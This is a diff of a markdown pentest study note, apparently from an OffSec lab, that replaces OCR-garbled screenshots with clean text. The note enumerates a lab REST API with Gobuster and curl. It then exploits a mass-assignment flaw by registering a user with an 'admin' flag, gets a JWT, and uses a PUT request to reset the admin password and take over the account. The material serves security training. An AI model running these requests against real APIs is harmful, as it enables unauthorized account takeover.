@@ -103,19 +103,8 @@ Great! We were able to recreate the same behavior within our proxy, which, among
 
 Once we've tested several different APIs, we could navigate to the Target tab and then Site map. We can then retrieve the entire map of the paths we have been testing so far.
 
-> [!note]- Screenshot
-> ```
-> Japi_name/v1
-> Listing 8 - API Path Naming Convention
-> ```
-
-
-> [!note]- Screenshot
-> ```
-> {GOBUSTER}/v1.
-> {GOBUSTER}/v2
-> Listing 9 - Gobuster pattern
-> ```
+> [!info] API path naming convention
+> REST endpoints commonly follow the pattern `/api_name/v1`, where a descriptive name is followed by a version number (e.g. `/users/v1`, `/books/v2`).
 
 
 ```sh
@@ -124,264 +113,116 @@ Once we've tested several different APIs, we could navigate to the Target tab an
 ```
 
 
-> [!note]- Screenshot
-> ```
-> We are now ready to enumerate the API with gobuster using the following command:
-> kaligkali:~$ gobuster dir -u http://192.168.50.16:5002 -w
-> Jusr/share/wordlists/dirb/big.txt -p pattern
-> Gobuster v3.1.0
-> by 03 Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-> 
-> [+] url: http://192.168.50.16:5001
-> [+] Method: GET
-> [+] Threads: 10
-> [+] wordlist: Jusr/share/wordlists/dirb/big.txt
-> [+] Patterns: pattern (1 entries)
-> [+] Negative Status codes: 404
-> [+] User agent: gobuster/3.1.0
-> [+] Timeout: 10s
-> 2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
-> 7books/v1 (Status: 200) [Size: 235]
-> /console (Status: 200) [Size: 1985]
-> Jui (Status: 3@8) [Size: 265] [--> http://192.168.50.16:5001/ui/]
-> Jusers/v1 (Status: 200) [Size: 241]
-> Listing 10 - Bruteforcing API Paths
-> 
-> We discovered multiple hits, including two interesting entries that seem to be API
-> 
-> endpoints, /books/v1 and /users/v1.
-> ```
-
+Enumerate the API paths with Gobuster's pattern feature:
 
 ```sh
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
 ```
 
+Interesting hits from the output:
 
-> [!note]- Screenshot
-> ```
-> Q Tip
-> 
-> If we browse to the /ui path, we'll discover the entire APIs' documentation. Although
-> this is common during white-box testing, is not a luxury we normally have during a
-> black-box test.
-> ```
+```
+/books/v1   (Status: 200) [Size: 235]
+/console    (Status: 200) [Size: 1985]
+/ui         (Status: 301) [--> http://192.168.50.16:5001/ui/]
+/users/v1   (Status: 200) [Size: 241]
+```
+
+`/books/v1` and `/users/v1` are the two API endpoints worth investigating.
 
 
-> [!note]- Screenshot
-> ```
-> kaligkali:~§ curl -i http://192.168.50.16:5002/users/v1
-> HTTP/1.8 260 OK
-> Content-Type: application/json
-> Content-Length: 241
-> Server: Werkzeug/1.0.1 Python/3.7.13
-> Date: Wed, @6 Apr 2022 09:27:5@ GMT
-> {
-> vusers": [
-> {
-> “email”: “maili@mail.com”,
-> “username”: “namei”
-> bh
-> {
-> “email”: "mail2@mail.com”,
-> “username”: “name2”
-> bh
-> {
-> “email”: “admingmail.com”,
-> “username”: “admin”
-> +
-> ]
-> 3
-> TEC aE
-> The application returned three user accounts, including an administrative account that
-> seems to be worth further investigation. We can use this information to launch another
-> Gobuster-based brute force attack, this time targeting the admin user with a smaller
-> wordlist. To verify if any further API property is related to the username property, we'll
-> expand the API path by inserting the admin username at the very end.
-> ```
+> [!info] Tip
+> Browsing to the `/ui` path often exposes the full API documentation (e.g. a Swagger UI). This is common in white-box testing but rarely available in a black-box test.
 
+
+Inspect the `/users/v1` endpoint:
 
 ```sh
 curl -i http://192.168.50.16:5002/users/v1
 ```
 
+It returns `200 OK` with a JSON list of accounts, including an `admin` user:
 
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
-> /usr/share/wordlists/dirb/smal1.txt
-> Gobuster v3.1.0
-> by 03 Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-> [4] url: http: //192.168.50.16:5001/users/v1/admin/
-> [+] method: GET
-> [+] Threads: 10
-> [+] Wordlist: Jusr/share/wordlists/dirb/small txt
-> [+] Negative Status codes: 404
-> [+] User agent: gobuster/3.1.0
-> [+] Timeout: 10s
-> 2022/04/06 6:40:12 Starting gobuster in directory enumeration mode
-> Jemail (Status: 405) [Size: 142]
-> Jpassword (Status: 405) [Size: 142]
-> 2022/04/06 06:40:35 Finished
-> Listing 12 - Discovering extra APIs
-> ```
+```json
+{"users": [
+  {"email": "mail1@mail.com", "username": "name1"},
+  {"email": "mail2@mail.com", "username": "name2"},
+  {"email": "admin@mail.com", "username": "admin"}
+]}
+```
 
+Next, expand the path with the `admin` username (`/users/v1/admin/`) and brute force it to find further sub-properties.
+
+
+Brute force the admin sub-paths:
 
 ```sh
 gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
 ```
 
+Two sub-endpoints return `405` (path exists, GET not allowed):
 
-> [!note]- Screenshot
-> ```
-> The password API path seems enticing for our testing purposes, so we'll probe it via
-> curl.
-> kaligkali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
-> HTTP/1. 405 METHOD NOT ALLOWED
-> Content-Type: application/problem+json
-> Content-Length: 142
-> Server: Werkzeug/1.0.1 Python/3.7.13
-> Date: Wed, @6 Apr 2022 10:58:51 GMT
-> {
-> “detail”: “The method is not allowed for the requested URL.”,
-> “status”: 405,
-> “title: "Method Not Allowed",
-> “type”: “about:blank”
-> 3
-> Listing 13 - Discovering API unsupported methods
-> ```
+```
+/email      (Status: 405)
+/password   (Status: 405)
+```
 
+
+Probe the `password` sub-path directly:
 
 ```sh
 curl -i http://192.168.50.16:5002/users/v1/admin/password
 ```
 
+It returns `405 METHOD NOT ALLOWED` (`"The method is not allowed for the requested URL."`) — the endpoint exists, but GET is not supported. This hints that a different method (POST/PUT/PATCH) may change the admin password.
 
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
-> HTTP/1.0 484 NOT FOUND
-> Content-Type: application/json
-> Content-Length: 48
-> Server: Werkzeug/1.0.1 Python/3.7.13
-> Date: Wed, @6 Apr 2022 12:04:30 GMT
-> { “status”: "fail", “message”: “User not found"}
-> Listing 14 - Inspecting the ‘login' API
-> ```
 
+Check whether a `login` endpoint exists:
 
 ```sh
 curl -i http://192.168.50.16:5002/users/v1/login
 ```
 
+It returns `404 NOT FOUND` but with the body `{"status": "fail", "message": "User not found"}` — the API itself exists; we just need to send it valid parameters.
 
-> [!note]- Screenshot
-> ```
-> kaligkali:~§ curl -d ‘{"password": "fake", "username": "admin"}" -H ‘Content-Type:
-> application/json’ http://192.168.50.16:5002/users/v1/login
-> { “status”: “fail”, “message”: “Password is not correct for the given username."}
-> Listing 15 - Crafting a POST request against the login API
-> The API return message shows that the authentication failed, meaning that the API
-> parameters are correctly formed.
-> ```
 
+Send a POST login with a dummy password to confirm the request format:
 
 ```sh
 curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 ```
 
+Response: `{"status": "fail", "message": "Password is not correct for the given username."}` — the JSON parameters are correct, only the password is wrong.
 
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ curl -d *{"password”:"lab™, "username": "offsecadmin"}’ -H ‘Content-Type:
-> application/json’ http: //192.168.50.16:5002/users/vi/register
-> { “status”: “fail”, “message”: “‘email’ is a required property"}
-> 
-> Listing 16 - Attempting new User Registration
-> ```
 
+Try registering a new user via the `register` endpoint:
 
 ```sh
 curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
 ```
 
+Response: `{"status": "fail", "message": "'email' is a required property"}` — registration works but also needs an `email` field.
 
-> [!note]- Screenshot
-> ```
-> The API replied with a "fail" message stating that we should also include an email
-> address. We could take this opportunity to determine if there's any administrative key
-> we can abuse. Let's add the admin key, followed by a True value.
-> 
-> kali@kali:~$ curl -d
-> 
-> “password”: “lab”, “username”: “of fsec”, "email" :"pun@offsec.com™, "admin" :"True"}" -H
-> 
-> “Content-Type: application/json’ http://192.168.50.16:5002/users/vi/register
-> 
-> {"message": “Successfully registered. Login to receive an auth token.”, “status”:
-> 
-> “success”}
-> 
-> Listing 17 - Attempting to register a new user as admin
-> ```
 
+Now include the required `email`, and also add an undocumented `admin` key set to `True` to test for a mass-assignment / privilege escalation flaw:
 
 ```sh
 curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
 ```
 
+Response: `{"status": "success", "message": "Successfully registered. Login to receive an auth token."}` — the server accepted the `admin` flag, which it should never have done.
 
-> [!note]- Screenshot
-> ```
-> Since we received no error, it seems we were able to successfully register a new user
-> as an admin, which should not be permitted by design. Next, let's try to log in with the
-> credentials we just created by invoking the login API we discovered earlier.
-> 
-> kali@kali:~$ curl -d *{"password”: "lab", "username": "offsec"}" -H “Content-Type:
-> 
-> application/json’ http://192.168.50.16:5002/users/v1/login
-> 
-> {"auth_token”:
-> 
-> “eyJ@eXAi0i IKV1QiLCIHbGCi0i IIUZTINiI9 . eyJ1eHAIOJENDkyNZEyMDEsIm1hdCI6MTYOOTI3MDkwMSwic
-> 
-> 3ViTjoib2Zmc2Vj1n0.MYbSaiBkYpUGOTH-tw61tzH@jNABCDACR3_FdYLRkew", “message”:
-> 
-> “successfully logged in.", “status”: “success"}
-> 
-> Listing 18 - Logging in as an admin user
-> 
-> We were able to correctly sign in and retrieve a JSON Web Token (JWT) authentication
-> token. To obtain tangible proof that we are an administrative user, we should use this
-> token to change the admin user password.
-> ```
 
+Log in with the account we just created to obtain an auth token:
 
 ```sh
 curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 ```
 
+Response: `{"auth_token": "eyJ0eXAiOiJKV1Q...", "message": "Successfully logged in.", "status": "success"}` — we now hold a JWT for our admin-flagged user. Use it to change the real admin's password.
 
-> [!note]- Screenshot
-> ```
-> We can attempt this by forging a POST request that targets the password API.
-> kali@kali:~$ curl \
-> “http: //192.168.50.16:5002/users/vi/admin/password’ \
-> -H ‘Content-Type: application/json’ \
-> -H ‘Authorization: OAuth
-> eyJ0eXAi0iIKV1QiLCIhbGci0iITUZTANAI9. eyI1eHAi0jEZNDkyNzEyMDEsIm1hdCI6MTYOOTI3MDkuMSwic3
-> Vil joib2zmc2VjIn0.MYbSaiBkYpUGOTH-tw61tzW@jNABCDACR3_FdYLRkew" \
-> -d "{"password": “pwned”}"
-> {
-> “detail”: “The method is not allowed for the requested URL.”,
-> “status”: 405,
-> “title”: "Method Not Allowed”,
-> “type”: “about:blank”
-> 3
-> Listing 19 - Attempting to Change the Administrator Password via a POST request
-> We passed the JWT key inside the Authorization header along with the new password.
-> ```
 
+Attempt to change the admin password with a POST, passing the JWT in the `Authorization` header and the new password in the body:
 
 ```sh
 curl  \
@@ -391,22 +232,7 @@ curl  \
   -d '{"password": "pwned"}'
 ```
 
-
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ curl -x "PUT" \
-> “http: //192.168.50.16:5002/users/v1/admin/password’ \
-> -H ‘Content-Type: application/json’ \
-> -H ‘Authorization: OAuth
-> eyJ@eXAi0i JKV1QiLCIhbGci0i ITUZT1NiJ9. ey] 1eHAi0jEZNDkyNZE30TQsIm1hdCIGMTYOOTI3MTQSNCwic3
-> Viljoib2Zmc2VjIn@.0eZHirEcrZ5FOQqLb81HbII7f9KaRAkrywoaRUASgA4* \
-> -d ‘{"password": "pwned"}"
-> Listing 20 - Attempting to Change the Administrator Password via a PUT request
-> This time we received no error message, SO we can assume the application backend
-> processed the request without error. To prove that our attack succeeded, we can try
-> logging in as admin using the newly changed password.
-> ```
-
+The POST is rejected with `405 Method Not Allowed`, so try the `PUT` method (often used to replace a value) instead:
 
 ```sh
 curl -X 'PUT' \
@@ -416,79 +242,28 @@ curl -X 'PUT' \
   -d '{"password": "pwned"}'
 ```
 
-
-> [!note]- Screenshot
-> ```
-> kali@kali:~$ curl -d ‘{"password”:"pwned","username”:"admin"}" -H ‘Content-Type:
-> application/json’ http://192.168.50.16:5002/users/v1/login
-> {"auth_token™:
-> “eyJ@eXAi0iIKV10iLCIhbGci0iITUZIANiI9 . eyJ1eHALOjEZNDkyNzIxMjgs ImlhdCL6MTY@OTI3MTgyOCwic
-> 3ViljoiYWRtaW4ifQ. yNgxeTUH@XLE1K95TCU8810SLP61C17usZYoZD1U100", “message”:
-> “Successfully logged in.", “status”: “success"}
-> Listing 21 - Successfully logging in as the admin account
-> Nice! We managed to take over the admin account by exploiting a logical privilege
-> escalation bug present in the registration API.
-> ```
-
+The PUT returns no error, so the backend likely accepted the change. Confirm the takeover by logging in as `admin` with the new password:
 
 ```sh
 curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
 ```
 
+Login succeeds and returns a valid `auth_token` for `admin` — the account is taken over via a logical privilege-escalation bug in the registration API.
 
-> [!note]- Screenshot
-> ```
-> Burp Project Intruder Repeater Window Help
-> Dashboard Target Proxy —Intruder--~=—=sRepeater__~—« Sequencer =“ Decoder_-«=« Comparer
-> Request
-> Raw Hex =
-> 1 POST /users/vi/login HITP/1.1
-> Host: 192,168.50.16:5002
+
+> [!example] Replicating the request in Burp Repeater
+> In Repeater, build the same POST manually:
+> ```http
+> POST /users/v1/login HTTP/1.1
+> Host: 192.168.50.16:5002
 > Content-Type: application/json
-> sf
-> "password": "p ’
-> “username”: “ad
-> WH
-> Figure 23: Crafting a POST request in Burp for API testing
-> Next, we'll click on the Send button and verify the incoming response on the right pane.
-> Response ais
-> Pretty [ce ne
-> HTTP/1.0 200 ok
-> 2 Content-Type: application/json
-> 3 Content-Length: 224
-> Server: Werkzeug/1.0.1 Python/3.7.13
-> 5 Date: Thu, 07 Apr 2022 07:10:49 GMT
-> 74
-> “auth_token"
-> . i IKVLGALCIMBGci Oi ITUz 11 eHAd Oj E2NDkzMTUSNOksTml hd
-> f NTQOOSwic3ViTj 03) if. iNandSyXLzbbd2il 139un21
-> "message": " ‘ ged in."
-> "status":
-> +
-> Figure 24: Inspecting the API response value
+>
+> {"password": "pwned", "username": "admin"}
 > ```
+> Click Send; the right pane shows `HTTP/1.0 200 OK` with the `auth_token` in the JSON body — the same result as curl, now stored in Burp for later use.
 
-
-> [!note]- Screenshot
-> ```
-> up Project tnraer Repeater Window Help
-> Dashboard Taget__Poay—_‘Inruder_—Repeater”—“Sequencer—Decader_——<Comparer_—Loger_—‘Eslender ‘Projections —_Useroptlons
-> Sitemap Scope fase definitions
-> Filter Hiéngratfunditems ng mage and generalinry omer Nang éxresponses: dng empty folders
-> 
-> Sin tpineneaso.esooa Post snsiegh yon ow
-> 
-> @ di ep926850185002 POST seein 0 an BON
-> 
-> @ lg eplnga_easoesoo2 ost hecahegster > bo me son
-> 
-> ae ep926850155002 GET Jseraigin
-> p92 36850155002 GET Jseraregeer
-> Figure 18: Using the Site Map to organize AP! testing
-> 
-> From Burp's Site map, we can track the API we discovered and forward any saved
-> request to the Repeater or Intruder for further testing.
-> ```
+> [!info] Organizing API testing with the Site map
+> Under Target -> Site map, Burp records every path you have touched (POST `/users/v1/login`, POST `/users/v1/register`, etc.). From there you can send any saved request to Repeater or Intruder for further testing.
 
 ## Visual Flow
 
